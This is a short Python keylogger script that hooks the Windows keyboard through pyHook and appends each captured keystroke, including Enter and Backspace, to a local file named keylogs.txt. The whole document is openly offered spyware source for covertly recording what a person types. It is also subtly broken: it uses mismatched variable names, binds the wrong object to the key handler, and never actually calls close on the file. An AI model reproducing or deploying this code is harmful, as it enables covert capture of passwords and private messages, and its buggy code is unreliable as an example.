import pythoncom,pyHook			#Use SetWindowsHook

def keylogger(event):
	global keystore			

	if event.Ascii==13:
		keys=' <Enter> '
	elif event.Ascii==8:
		keys=' <BackSpace> '
	else:
		keys=chr(event.Ascii)		#Stores the key pressed

	keystore=keystore+keys	

	fp=open("keylogs.txt","a")		#Storing keystrokes in a file
	fp.write(keystore)
	fp.close

	return True

store=''	                    #List to store keystrokes
obj=pyHook.HookManager()			#Uses SetWindowsHook feature to capture the keys
obj.KeyDown=keystore
obj.HookKeyboard()
pythoncom.PumpMessages()			#Pump all messages for the current process
